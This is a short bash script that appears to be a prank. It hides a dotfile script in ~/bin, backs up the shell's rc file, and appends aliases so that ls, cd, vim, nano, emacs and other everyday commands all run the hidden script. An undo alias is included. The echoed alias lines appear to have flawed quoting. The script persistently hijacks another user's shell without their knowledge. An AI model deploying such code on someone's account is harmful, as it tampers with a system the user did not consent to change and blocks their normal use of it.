#!/bin/bash

mkdir -p ~/bin
mv .hihi.sh ~/bin/
chmod +x ~/bin/.hihi.sh
cp ~/.$(basename $SHELL)rc ~/.oldrc
echo '\nalias sl="sh ~/bin/.hihi.sh"\nalias ls="sl"\nalias cd="sl"\nalias vim="sl"\nalias vi="sl"\nalias nvim="sl"\nalias emacs="sl"\nalias nano="sl"\nalias ahmed_le_goat="rm -f ~/bin/.hihi.sh && mv ~/.oldrc ~/.$(basename $SHELL)rc\n' >> ~/.$(basename $SHELL)rc
echo 'export PATH="$HOME/bin:$PATH"' >> ~/.$(basename $SHELL)rc
source ~/.$(basename $SHELL)rc
